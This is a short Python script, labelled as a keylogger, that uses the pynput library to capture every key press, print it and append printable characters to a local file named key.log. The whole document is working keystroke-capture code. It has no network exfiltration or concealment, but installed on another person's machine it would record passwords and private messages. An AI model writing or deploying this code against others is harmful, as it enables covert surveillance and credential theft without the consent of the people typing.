#Python program to implement a keylogger.

from pynput import keyboard
def on_press(key):
    with open("key.log", "a+") as file:
        try:
            file.write(key.char)
            print(key.char)
        except AttributeError:
            print(key)
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
